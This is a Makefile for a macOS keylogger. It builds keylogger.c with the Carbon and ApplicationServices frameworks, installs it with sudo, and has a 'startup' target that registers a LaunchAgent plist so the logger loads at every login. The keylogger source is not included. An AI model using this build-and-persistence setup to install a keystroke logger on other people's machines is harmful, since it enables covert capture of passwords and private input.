CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
INSTALLBIN=/usr/local/bin/keylogger
PLIST=keylogger.plist
PLISTFULL=/Library/LaunchAgents/keylogger.plist

all: $(SOURCES)
	./configure
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	sudo mkdir -p /usr/local/bin
	sudo install -m755 $(EXECUTABLE) $(INSTALLBIN)

uninstall:
	launchctl unload $(PLISTFULL)
	sudo $(RM) $(INSTALLBIN)
	$(RM) $(PLISTFULL)

startup: install
	sudo cp -f -v $(PLIST) $(PLISTFULL)
	launchctl load -w $(PLISTFULL)

load:
	launchctl load $(PLISTFULL)

unload:
	launchctl unload $(PLISTFULL)

clean:
	$(RM) $(EXECUTABLE)
